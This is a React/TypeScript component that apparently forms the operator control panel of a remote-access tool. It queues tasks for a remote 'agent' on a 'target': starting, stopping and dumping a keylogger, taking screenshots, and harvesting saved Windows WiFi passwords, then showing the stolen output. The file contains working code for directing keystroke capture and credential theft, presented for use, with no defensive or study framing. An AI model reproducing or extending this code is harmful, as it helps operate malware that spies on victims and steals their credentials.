/**
 * Agent Tasks Component
 * 
 * Special operations: keylogger, screenshot, credentials
 */

import React, { useState, useEffect } from 'react';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import toast from 'react-hot-toast';
import { Keyboard, Camera, Key, Play, Square, Download, Loader } from 'lucide-react';
import { Card } from '../common/Card';
import { Button } from '../common/Button';
import { tasksApi } from '../../lib/api';
import type { Agent, Task } from '../../types';

interface AgentTasksProps {
  agent: Agent;
}

export function AgentTasks({ agent }: AgentTasksProps) {
  const queryClient = useQueryClient();
  const [keyloggerActive, setKeyloggerActive] = useState(false);

  // Fetch tasks for this agent
  const { data: tasks = [] } = useQuery({
    queryKey: ['tasks', agent.agent_id],
    queryFn: () => tasksApi.list({ agent_id: agent.agent_id }),
    refetchInterval: 3000,
  });

  // Determine keylogger state from recent tasks
  useEffect(() => {
    const keylogTasks = tasks
      .filter((t: Task) => t.task_type === 'keylog_start' || t.task_type === 'keylog_stop')
      .sort((a: Task, b: Task) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    
    if (keylogTasks.length > 0) {
      const latestKeylogTask = keylogTasks[0];
      setKeyloggerActive(latestKeylogTask.task_type === 'keylog_start');
    }
  }, [tasks]);

  // Create task mutation
  const createTaskMutation = useMutation({
    mutationFn: (data: { task_type: string; command?: string }) =>
      tasksApi.create({
        agent_id: agent.agent_id,
        task_type: data.task_type,
        command: data.command || '',
        priority: 5,
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['tasks'] });
      toast.success('Task created');
    },
    onError: (error: any) => {
      toast.error(error.response?.data?.detail || 'Failed to create task');
    },
  });

  const handleKeyloggerStart = () => {
    createTaskMutation.mutate({ task_type: 'keylog_start' });
  };

  const handleKeyloggerStop = () => {
    createTaskMutation.mutate({ task_type: 'keylog_stop' });
  };

  const handleKeyloggerDump = () => {
    createTaskMutation.mutate({ task_type: 'keylog_dump' });
  };

  const handleScreenshot = () => {
    createTaskMutation.mutate({ task_type: 'screenshot' });
  };

  const handleCredentials = () => {
    createTaskMutation.mutate({ task_type: 'credentials' });
  };

  // Filter tasks: only show screenshot, credentials, keylog_dump results
  const specialTasks = tasks.filter((t: Task) => 
    ['screenshot', 'credentials', 'keylog_dump'].includes(t.task_type)
  );

  return (
    <div className="space-y-6">
      {/* Keylogger */}
      <Card>
        <div className="flex items-start justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-purple-500/10 rounded-lg">
              <Keyboard className="w-6 h-6 text-purple-600" />
            </div>
            <div>
              <h3 className="text-lg font-semibold text-dark-900">Keylogger</h3>
              <p className="text-sm text-dark-600">Record keystrokes from the target</p>
            </div>
          </div>
          <div className={`px-3 py-1 rounded-full text-sm font-medium ${
            keyloggerActive 
              ? 'bg-green-500/10 text-green-600' 
              : 'bg-gray-500/10 text-gray-600'
          }`}>
            {keyloggerActive ? 'Running' : 'Stopped'}
          </div>
        </div>

        <div className="flex gap-3">
          <Button
            variant={keyloggerActive ? 'secondary' : 'primary'}
            onClick={handleKeyloggerStart}
            disabled={keyloggerActive || createTaskMutation.isPending}
            isLoading={createTaskMutation.isPending}
          >
            <Play className="w-4 h-4 mr-2" />
            Start
          </Button>
          <Button
            variant={keyloggerActive ? 'danger' : 'secondary'}
            onClick={handleKeyloggerStop}
            disabled={!keyloggerActive || createTaskMutation.isPending}
            isLoading={createTaskMutation.isPending}
          >
            <Square className="w-4 h-4 mr-2" />
            Stop
          </Button>
          <Button
            variant="secondary"
            onClick={handleKeyloggerDump}
            disabled={createTaskMutation.isPending}
            isLoading={createTaskMutation.isPending}
          >
            <Download className="w-4 h-4 mr-2" />
            Download Logs
          </Button>
        </div>
      </Card>

      {/* Screenshot */}
      <Card>
        <div className="flex items-start justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-blue-500/10 rounded-lg">
              <Camera className="w-6 h-6 text-blue-600" />
            </div>
            <div>
              <h3 className="text-lg font-semibold text-dark-900">Screenshot</h3>
              <p className="text-sm text-dark-600">Capture the current screen</p>
            </div>
          </div>
        </div>

        <Button
          variant="primary"
          onClick={handleScreenshot}
          isLoading={createTaskMutation.isPending}
        >
          <Camera className="w-4 h-4 mr-2" />
          Capture Screenshot
        </Button>
      </Card>

      {/* Credentials */}
      <Card>
        <div className="flex items-start justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-orange-500/10 rounded-lg">
              <Key className="w-6 h-6 text-orange-600" />
            </div>
            <div>
              <h3 className="text-lg font-semibold text-dark-900">Credentials</h3>
              <p className="text-sm text-dark-600">Harvest saved WiFi passwords (Windows)</p>
            </div>
          </div>
        </div>

        <Button
          variant="primary"
          onClick={handleCredentials}
          isLoading={createTaskMutation.isPending}
        >
          <Key className="w-4 h-4 mr-2" />
          Harvest Credentials
        </Button>
      </Card>

      {/* Recent Task Results - Only special tasks */}
      <Card>
        <h3 className="text-lg font-semibold text-dark-900 mb-4">Recent Results</h3>
        
        {specialTasks.length === 0 ? (
          <p className="text-sm text-dark-600 text-center py-8">
            No special task results yet. Capture a screenshot, harvest credentials, or download keylogs.
          </p>
        ) : (
          <div className="space-y-3 max-h-96 overflow-y-auto">
            {specialTasks.slice(0, 10).map((task: Task) => (
              <div
                key={task.id}
                className="p-3 bg-dark-50 rounded-lg"
              >
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-dark-900 capitalize">
                    {task.task_type.replace('_', ' ')}
                  </span>
                  <span className={`text-xs px-2 py-1 rounded ${
                    task.status === 'completed' 
                      ? 'bg-green-100 text-green-700'
                      : task.status === 'failed'
                      ? 'bg-red-100 text-red-700'
                      : 'bg-yellow-100 text-yellow-700'
                  }`}>
                    {task.status}
                  </span>
                </div>
                {task.result?.output && (
                  <pre className="text-xs text-dark-700 bg-dark-100 p-2 rounded overflow-x-auto max-h-32">
                    {task.result.output.substring(0, 200)}
                    {task.result.output.length > 200 && '...'}
                  </pre>
                )}
                {task.result?.error && (
                  <pre className="text-xs text-red-600 bg-red-50 p-2 rounded overflow-x-auto">
                    {task.result.error}
                  </pre>
                )}
              </div>
            ))}
          </div>
        )}
      </Card>
    </div>
  );
}